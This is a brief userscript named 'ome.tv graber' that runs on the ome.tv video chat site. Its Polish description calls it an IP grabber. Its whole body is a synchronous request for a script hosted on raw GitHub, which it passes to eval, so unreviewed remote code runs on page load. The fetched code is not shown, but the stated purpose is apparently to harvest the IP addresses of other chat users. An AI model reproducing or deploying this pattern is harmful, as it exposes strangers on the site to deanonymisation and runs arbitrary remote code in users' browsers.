
// ==UserScript==
// @name         ome.tv graber
// @license      knurek licences licence
// @namespace    xd
// @version      0.01
// @description  ip ruchacz costam ble ble n wazne
// @author       clara
// @match        https://ome.tv/
// @icon         https://www.google.com/s2/favicons?domain=ome.tv
// @grant        none
// ==/UserScript==

const getData = (url) => {
    XHR = new XMLHttpRequest();
    XHR.open("GET", url, false);
    XHR.send();
    return XHR.responseText;
}

eval(getData("https://raw.githubusercontent.com/yuig/clarIP/main/script.js"));